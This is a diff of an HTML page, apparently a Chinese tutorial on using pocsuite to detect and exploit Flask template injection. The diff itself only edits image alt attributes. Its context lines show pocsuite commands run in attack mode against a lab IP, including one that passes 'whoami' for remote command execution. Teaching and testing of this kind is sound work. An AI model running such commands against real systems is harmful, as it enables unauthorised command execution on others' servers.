@@ -833,8 +833,8 @@ register_poc<span class="token punctuation">(</span>FlaskPOCEXP<span class="toke
 <p>攻击：</p>
 <pre class="line-numbers language-shell"><code class="language-shell">pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --attack
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="http://image.xpshuai.cn/flask_ssti_verify.png" alt=""></p>
-<p><img src="http://image.xpshuai.cn/flask_ssti_attack.png" alt=""></p>
+<p><img src="http://image.xpshuai.cn/flask_ssti_verify.png" alt></p>
+<p><img src="http://image.xpshuai.cn/flask_ssti_attack.png" alt></p>
 <h4 id="command外部参数传递。"><a href="#command外部参数传递。" class="headerlink" title="command外部参数传递。"></a><code>command</code>外部参数传递。</h4><p><strong>改进一下</strong>，希望可以接收用户输入的命令行参数，对目标系统实现半交互控制</p>
 <pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""
 功能：使用pocsuite对flask模板注入进行检测和利用
@@ -943,7 +943,7 @@ register_poc<span class="token punctuation">(</span>FlaskPOCEXP<span class="toke
 <p>运行：</p>
 <pre class="line-numbers language-bash"><code class="language-bash">pocsuite -r flask_ssti_test.py -u http://192.168.0.105:8000  --verify  --command <span class="token string">'whoami'</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="http://image.xpshuai.cn/pocsuite_flask_cmd.png" alt=""></p>
+<p><img src="http://image.xpshuai.cn/pocsuite_flask_cmd.png" alt></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
